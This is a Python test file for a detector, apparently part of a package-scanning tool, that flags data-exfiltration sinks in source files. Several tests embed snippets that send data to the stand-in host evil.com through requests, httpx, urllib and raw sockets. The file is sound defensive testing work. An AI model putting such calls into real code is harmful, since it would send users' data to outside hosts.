"""Tests for exfil_detector."""

import tempfile
from pathlib import Path

from pipguard.detectors.exfil_detector import detect_exfil


def _write_py(content: str) -> Path:
    f = tempfile.NamedTemporaryFile(suffix=".py", mode="w", delete=False)
    f.write(content)
    f.close()
    return Path(f.name)


class TestExfilDetector:
    def test_no_exfil(self):
        path = _write_py("x = 1 + 2\n")
        findings = detect_exfil(path)
        assert findings == []

    def test_requests_post(self):
        code = "import requests\nrequests.post('http://evil.com', data={'key': 'val'})\n"
        path = _write_py(code)
        findings = detect_exfil(path)
        assert len(findings) >= 1
        assert findings[0].rule_id == "EXFIL-SINK"

    def test_httpx_post(self):
        code = "import httpx\nhttpx.post('http://evil.com', json={})\n"
        path = _write_py(code)
        findings = detect_exfil(path)
        assert len(findings) >= 1

    def test_urllib_urlopen(self):
        code = "import urllib.request\nurllib.request.urlopen('http://evil.com')\n"
        path = _write_py(code)
        findings = detect_exfil(path)
        assert len(findings) >= 1

    def test_socket_connect(self):
        code = "import socket\nsocket.connect(('evil.com', 80))\n"
        path = _write_py(code)
        findings = detect_exfil(path)
        assert len(findings) >= 1

    def test_benign_import_no_call(self):
        code = "import requests\n\ndef safe():\n    pass\n"
        path = _write_py(code)
        findings = detect_exfil(path)
        assert findings == []
